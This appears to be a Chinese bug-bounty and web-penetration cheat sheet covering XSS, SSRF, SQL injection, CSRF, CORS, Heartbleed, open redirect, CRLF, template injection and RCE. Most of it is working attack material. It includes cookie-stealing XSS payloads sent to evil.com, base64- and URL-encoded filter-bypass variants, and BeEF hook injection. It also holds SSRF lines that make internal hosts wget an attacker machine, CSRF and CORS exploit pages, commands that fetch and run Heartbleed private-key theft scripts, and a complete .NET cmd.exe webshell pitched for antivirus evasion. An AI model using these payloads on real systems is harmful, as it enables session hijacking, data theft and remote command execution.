<p>可还行<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181213170933-ce4344dc-feb6-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181213170933-ce4344dc-feb6-1.png" alt="img"></a></p>
<h3 id="偷Cookie"><a href="#偷Cookie" class="headerlink" title="偷Cookie"></a>偷Cookie</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src/onerror=document.location=&quot;http://evil.com:8090/cookiez.php?c=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure>

<p>Blacklist bypass:<br>过滤了<code>//,:,&quot;,&lt;和&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">btoa(&apos;document.location=&quot;http://evil.com:8090/r.php?c=&quot;+document.cookie&apos;)</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbTo4MDkwL3IucGhwP2M9Iitkb2N1bWVudC5jb29raWU=&apos;))</span><br></pre></td></tr></table></figure>

<p>另外一个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new Image().src=&quot;http://evil.com:8090/b.php?&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>比较不错的一个payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=fetch(&quot;//attacker/r.php?=&quot;%2Bcookie)&gt;</span><br></pre></td></tr></table></figure>

<p>nc 监听：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8090</span><br></pre></td></tr></table></figure>

<h3 id="测试session劫持"><a href="#测试session劫持" class="headerlink" title="测试session劫持"></a>测试session劫持</h3><p>利用burp重放功能进行测试。<br>看不同cookie会有什么变化。</p>
<h3 id="FILTER-BYPASS-RESOURCES"><a href="#FILTER-BYPASS-RESOURCES" class="headerlink" title="FILTER BYPASS RESOURCES"></a>FILTER BYPASS RESOURCES</h3><p>收集到的payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</span><br><span class="line">https://bittherapy.net/a-trick-to-bypass-an-xss-filter-and-execute-javascript/</span><br><span class="line">https://support.portswigger.net/customer/portal/articles/2590820-bypassing-signature-based-xss-filters-modifying-script-code</span><br><span class="line">https://brutelogic.com.br/blog/avoiding-xss-detection/</span><br><span class="line">https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec</span><br></pre></td></tr></table></figure>

<h3 id="基于POST的XSS"><a href="#基于POST的XSS" class="headerlink" title="基于POST的XSS"></a>基于POST的XSS</h3><p>如果遇到无法将基于POST的XSS转换为GET请求的情况(可能目标服务器上禁用了GET请求)，试试CSRF。</p>
<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;target.com&gt;/#&lt;img/src/onerror=alert(&quot;XSS&quot;)&gt;</span><br></pre></td></tr></table></figure>

<p>beef的hook，urlencode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;target.com&gt;/#img/src/onerror=$(&quot;body&quot;).append(decodeURIComponent(&apos;%3c%73%63%72%69%70%74%20%73%72%63%3d%68%74%74%70%3a%2f%2f%3c%65%76%69%6c%20%69%70%3e%3a%33%30%30%30%2f%68%6f%6f%6b%2e%6a%73%3e%3c%2f%73%63%72%69%70%74%3e&apos;))&gt;</span><br><span class="line">#&lt;img/src=&quot;1&quot;/onerror=alert(1)&gt;</span><br><span class="line">#&gt;&lt;img src=x onerror=prompt(1);&gt;</span><br></pre></td></tr></table></figure>

<p>这些站点有大量的xss payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</span><br><span class="line">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS injection</span><br><span class="line">https://zseano.com/tutorials/4.html</span><br><span class="line">https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md</span><br><span class="line">http://www.smeegesec.com/2012/06/collection-of-cross-site-scripting-xss.html</span><br><span class="line">http://www.xss-payloads.com/payloads-list.html?a#category=all</span><br></pre></td></tr></table></figure>

<p>payload生成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xssor.io</span><br><span class="line">http：//www.jsfuck.com/</span><br><span class="line">https://github.com/aemkei/jsfuck</span><br><span class="line">https://convert.town/ascii-to-text</span><br><span class="line">http://jdstiles.com/java/cct.html</span><br></pre></td></tr></table></figure>

<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>在可以控制url参数的情况下，只要不重定向，就可以测试一下SSRF。<br>Webhooks, PDF 生成， 文档解析, 文件上传这些地方都可以重点关注一下。</p>
<p>PS:<a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF" target="_blank" rel="noopener">https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF</a></p>
<p>想办法探测内网资产：<a href="http://internal-server:22/notarealfile.txt" target="_blank" rel="noopener">http://internal-server:22/notarealfile.txt</a><br>更换端口，查看回显，判断端口的开放。<br>没有回显的情况下，按照响应时间判断，以及DNSLOG，这玩意burp自带的也好用的。<br>根据我的经验，一些组件只能使用某些端口，例如80,8080,443等。最好对这些端口进行测试。</p>
<p>如果你的payload中有路径，最好带上&amp;,#</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000&amp;</span><br><span class="line">http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000#</span><br></pre></td></tr></table></figure>

<p>这篇文章对SOP和CORS以及SSRF都有很好的讲解：https//<a href="http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/" target="_blank" rel="noopener">www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/</a></p>
<p>Bug Bounty Write-ups:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://hackerone.com/reports/115748</span><br><span class="line">https://hackerone.com/reports/301924</span><br><span class="line">https://www.sxcurity.pro/hackertarget/</span><br><span class="line">http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html</span><br><span class="line">https://seanmelia.files.wordpress.com/2016/07/ssrf-to-pivot-internal-networks.pdf</span><br><span class="line">https://github.com/ngalongc/bug-bounty-reference#server-side-request-forgery-ssrf</span><br><span class="line">https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/</span><br></pre></td></tr></table></figure>

<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>使用SQLMap在PUT REST Params中测试SQLi：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 使用 *标记Vulnerable参数</span><br><span class="line">2. 复制请求并将其粘贴到文件中。</span><br><span class="line">3. 用sqlmap运行：</span><br><span class="line">sqlmap -r &lt;file with request&gt; -vvvv</span><br></pre></td></tr></table></figure>

<p>备忘录:<a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p>
<p>可以试试双编码输入。</p>
<h2 id="会话固定"><a href="#会话固定" class="headerlink" title="会话固定"></a>会话固定</h2><p>快速检查的方法，可用于确定会话固定漏洞是否是网站上的问题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">转到登录页面，观察未经身份验证的用户拥有的会话ID。</span><br><span class="line"></span><br><span class="line">登录该站点。进入后，观察用户拥有的会话ID。如果会话ID与用户进行身份验证之前由站点提供的会话ID匹配，那么存在会话固定漏洞。</span><br></pre></td></tr></table></figure>

<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>一些绕过技术，即使有CSRF Token:<br><a href="https://zseano.com/tutorials/5.html" target="_blank" rel="noopener">https://zseano.com/tutorials/5.html</a></p>
<p>csrf和reset api:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function jsonreq() &#123;</span><br><span class="line">  var xmlhttp = new XMLHttpRequest();</span><br><span class="line">  xmlhttp.open(&quot;POST&quot;,&quot;https://target.com/api/endpoint&quot;, true);</span><br><span class="line">  xmlhttp.setRequestHeader(&quot;Content-Type&quot;,&quot;text/plain&quot;);</span><br><span class="line">  //xmlhttp.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json;charset=UTF-8&quot;);</span><br><span class="line">  xmlhttp.withCredentials = true;</span><br><span class="line">  xmlhttp.send(JSON.stringify(&#123;&quot;test&quot;:&quot;x&quot;&#125;));</span><br><span class="line">&#125;</span><br><span class="line">jsonreq();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>案例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b</span><br><span class="line">http://c0rni3sm.blogspot.com/2018/01/1800-in-less-than-hour.html</span><br></pre></td></tr></table></figure>

<p>CSRF TO REDECT XSS</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;p&gt;Please wait... ;)&lt;/p&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">let host = &apos;http://target.com&apos;</span><br><span class="line">let beef_payload = &apos;%3c%73%63%72%69%70%74%3e%20%73%3d%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%73%63%72%69%70%74%27%29%3b%20%73%2e%74%79%70%65%3d%27%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%27%3b%20%73%2e%73%72%63%3d%27%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%2f%68%6f%6f%6b%2e%6a%73%27%3b%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%27%68%65%61%64%27%29%5b%30%5d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%73%29%3b%20%3c%2f%73%63%72%69%70%74%3e&apos;</span><br><span class="line">let alert_payload = &apos;%3Cimg%2Fsrc%2Fonerror%3Dalert(1)%3E&apos;</span><br><span class="line"></span><br><span class="line">function submitRequest() &#123;</span><br><span class="line">  var req = new XMLHttpRequest();</span><br><span class="line">  req.open(&lt;CSRF components, which can easily be copied from Burp&apos;s POC generator&gt;);</span><br><span class="line">  req.setRequestHeader(&quot;Accept&quot;, &quot;*\/*&quot;);</span><br><span class="line">  req.withCredentials = true;</span><br><span class="line">  req.onreadystatechange = function () &#123;</span><br><span class="line">    if (req.readyState === 4) &#123;</span><br><span class="line">      executeXSS();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  req.send();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function executeXSS() &#123;</span><br><span class="line">  window.location.assign(host+&apos;&lt;URI with XSS&gt;&apos;+alert_payload);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">submitRequest();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>在OS X上创建测试10g文件（对于测试文件上载限制很有用）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfile -n 10g temp_10GB_file</span><br></pre></td></tr></table></figure>

<h3 id="无限制的文件上传"><a href="#无限制的文件上传" class="headerlink" title="无限制的文件上传"></a>无限制的文件上传</h3><p>资源:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nileshkumar83.blogspot.com/2017/01/file-upload-through-null-byte-injection.html</span><br></pre></td></tr></table></figure>

<p>一些备忘录:<a href="https://github.com/jhaddix/tbhm" target="_blank" rel="noopener">https://github.com/jhaddix/tbhm</a></p>
<h3 id="CORS配置错误"><a href="#CORS配置错误" class="headerlink" title="CORS配置错误"></a>CORS配置错误</h3><p>用于测试的POC:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">      &lt;h2&gt;CORS POC Exploit&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div id=&quot;demo&quot;&gt;</span><br><span class="line">        &lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Exploit&lt;/button&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;script&gt;</span><br><span class="line">function cors() &#123;</span><br><span class="line">  var req = new XMLHttpRequest();</span><br><span class="line">  req.onreadystatechange = function() &#123;</span><br><span class="line">    if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</span><br><span class="line">      document.getElementById(&quot;demo&quot;).innerHTML = this.responseText;</span><br><span class="line">      // If you want to print something out after it finishes:</span><br><span class="line">      //alert(req.getAllResponseHeaders());</span><br><span class="line">      //alert(localStorage.access_token);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  // If you need to set a header (you probably won&apos;t):</span><br><span class="line">  // req.setRequestHeader(&quot;header name&quot;, &quot;value&quot;);</span><br><span class="line">  req.open(&quot;GET&quot;, &quot;&lt;site&gt;&quot;, true);</span><br><span class="line">  req.withCredentials = true;</span><br><span class="line">  req.send();</span><br><span class="line">&#125;</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>资源:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https://www.securityninja.io/understanding-cross-origin-resource-sharing-cors/</span><br><span class="line">http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html</span><br><span class="line">https://www.youtube.com/watch?v=wgkj4ZgxI4c</span><br><span class="line">http://ejj.io/misconfigured-cors/</span><br><span class="line">https://www.youtube.com/watch?v=lg31RYYG-T4</span><br><span class="line">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS</span><br><span class="line">https://w3c.github.io/webappsec-cors-for-developers/#cors</span><br><span class="line">http://gerionsecurity.com/2013/11/cors-attack-scenarios/</span><br><span class="line">Using CORS misconfiguration to steal a CSRF Token:</span><br><span class="line">https://yassineaboukir.com/blog/security-impact-of-a-misconfigured-cors-implementation/</span><br></pre></td></tr></table></figure>

<h2 id="测试心脏出血漏洞"><a href="#测试心脏出血漏洞" class="headerlink" title="测试心脏出血漏洞"></a>测试心脏出血漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -d --script ssl-heartbleed --script-args vulns.showall -sV -p &lt;port&gt; &lt;target ip&gt; --script-trace -oA heartbleed-%y%m%d</span><br></pre></td></tr></table></figure>

<h3 id="偷私钥"><a href="#偷私钥" class="headerlink" title="偷私钥"></a>偷私钥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py</span><br><span class="line">echo &quot;&lt;target&gt;:&lt;port&gt;&quot; &gt; targets.txt</span><br><span class="line">python heartbleed.py -f targets.txt -v -e</span><br><span class="line">wget https://raw.githubusercontent.com/sensepost/heartbleed-poc/master/heartbleed-poc.py</span><br><span class="line">python heartbleed-poc.py &lt;target&gt; -p &lt;target port&gt; | less</span><br></pre></td></tr></table></figure>

<p><a href="https://gist.github.com/bonsaiviking/10402038" target="_blank" rel="noopener">https://gist.github.com/bonsaiviking/10402038</a><br><a href="https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py" target="_blank" rel="noopener">https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py</a></p>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p><a href="http://breenmachine.blogspot.com/2013/01/abusing-open-redirects-to-bypass-xss.html" target="_blank" rel="noopener">http://breenmachine.blogspot.com/2013/01/abusing-open-redirects-to-bypass-xss.html</a></p>
<p>重定向到beef：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; s=document.createElement(&apos;script&apos;); s.type=&apos;text/javascript&apos;; s.src=&apos;http://evil.com:3000/hook.js&apos;; document.getElementsByTagName(&apos;head&apos;)[0].appendChild(s); &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>使用Burp中的Decoder将其编码为base-64，并将其传递给payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/html;base64,PHNjcmlwdD4gcz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsgcy50eXBlPSd0ZXh0L2phdmFzY3JpcHQnOyBzLnNyYz0naHR0cDovL2V2aWwuY29tOjMwMDAvaG9vay5qcyc7IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdoZWFkJylbMF0uYXBwZW5kQ2hpbGQocyk7IDwvc2NyaXB0Pg==</span><br></pre></td></tr></table></figure>

<p>other：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://;URL=javascript:alert(&apos;XSS&apos;)</span><br><span class="line">data:text/html%3bbase64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20redirect" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20redirect</a></p>
<h2 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h2><p>当你看到请求的参数是这样:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://inj.example.org/redirect.asp?origin=foo</span><br></pre></td></tr></table></figure>

<p>回显是这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Object moved</span><br><span class="line">Date: Mon, 07 Mar 2016 17:42:46 GMT</span><br><span class="line">Location: account.asp?origin=foo</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 121</span><br><span class="line"></span><br><span class="line">&lt;head&gt;&lt;title&gt;Object moved&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;h1&gt;Object Moved&lt;/h1&gt;This object may be found &lt;a HREF=&quot;&quot;&gt;here&lt;/a&gt;.&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>尝试CRLF注射：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://inj.example.org/redirect.asp?origin=foo%0d%0aSet-Cookie:%20ASPSESSIONIDACCBBTCD=SessionFixed%0d%0a</span><br><span class="line">CRLF： %0d%0a</span><br><span class="line">https://www.gracefulsecurity.com/http-header-injection/</span><br><span class="line">https://www.owasp.org/index.php/Testing_for_HTTP_Splitting/Smuggling_(OTG-INPVAL-016)</span><br><span class="line">https://www.acunetix.com/websitesecurity/crlf-injection/</span><br><span class="line">https://blog.innerht.ml/twitter-crlf-injection/</span><br></pre></td></tr></table></figure>

<h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><p>您可以将一些代码放入jsfiddle以进行payload测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div ng-app&gt;</span><br><span class="line">&#123;&#123;constructor.constructor(&apos;alert(1)&apos;)()&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><a href="http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html" target="_blank" rel="noopener">http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html</a></p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>使用WEBSHELL上传（.NET）绕过AV：<br>这是一个示例，其中包含fuzzdb项目中的一个webshel​​l：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;</span><br><span class="line">&lt;script Language=&quot;c#&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">void Page_Load(object sender, EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">string executeIt(string arg)</span><br><span class="line">&#123;</span><br><span class="line">ProcessStartInfo psi = new ProcessStartInfo();</span><br><span class="line">psi.FileName = &quot;cmd.exe&quot;;</span><br><span class="line">psi.Arguments = &quot;/c &quot;+arg;</span><br><span class="line">psi.RedirectStandardOutput = true;</span><br><span class="line">psi.UseShellExecute = false;</span><br><span class="line">Process p = Process.Start(psi);</span><br><span class="line">StreamReader stmrdr = p.StandardOutput;</span><br><span class="line">string s = stmrdr.ReadToEnd();</span><br><span class="line">stmrdr.Close();</span><br><span class="line">return s;</span><br><span class="line">&#125;</span><br><span class="line">void cmdClick(object sender, System.EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">Response.Write(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">Response.Write(Server.HtmlEncode(executeIt(txtArg.Text)));</span><br><span class="line">Response.Write(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;title&gt;REALLY NICE&lt;/title&gt;</span><br><span class="line">&lt;/HEAD&gt;</span><br><span class="line">&lt;body &gt;</span><br><span class="line">&lt;form id=&quot;cmd&quot; method=&quot;post&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">&lt;asp:TextBox id=&quot;txtArg&quot; style=&quot;Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px&quot; runat=&quot;server&quot; Width=&quot;250px&quot;&gt;&lt;/asp:TextBox&gt;</span><br><span class="line">&lt;asp:Button id=&quot;testing&quot; style=&quot;Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px&quot; runat=&quot;server&quot; Text=&quot;execute&quot; OnClick=&quot;cmdClick&quot;&gt;&lt;/asp:Button&gt;</span><br><span class="line">&lt;asp:Label id=&quot;lblText&quot; style=&quot;Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px&quot; runat=&quot;server&quot;&gt;Command:&lt;/asp:Label&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://hax365.wordpress.com/2015/12/15/easy-trick-to-upload-a-web-shell-and-bypass-av-products/" target="_blank" rel="noopener">https://hax365.wordpress.com/2015/12/15/easy-trick-to-upload-a-web-shell-and-bypass-av-products/</a></p>
